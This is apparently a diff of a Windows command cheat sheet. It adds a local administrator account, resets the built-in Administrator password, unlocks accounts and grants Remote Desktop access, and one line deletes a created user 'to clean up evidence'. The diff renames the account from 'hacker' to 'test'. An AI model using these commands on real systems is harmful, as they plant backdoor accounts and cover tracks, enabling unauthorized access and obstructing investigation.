@@ -1,12 +1,16 @@
 
-net user hacker Password123 /add
-net localgroup Administrators hacker /add
+net user test Password123 /add
+net localgroup Administrators test /add
 ------------------------------------------
 
 net user [username] [new_password]
+net user Administrator NewPassword123
+
+---------------------------------------
 
 Unlock a locked-out account:
 net user [username] /active:yes
+
 -----------------------------------------
 
 Add a user to the Remote Desktop Users group to allow RDP access:
@@ -19,4 +23,3 @@ Remove a created user to clean up evidence:
 net user [username] /delete
 ------------------------------------------
 
-net user Administrator NewPassword123
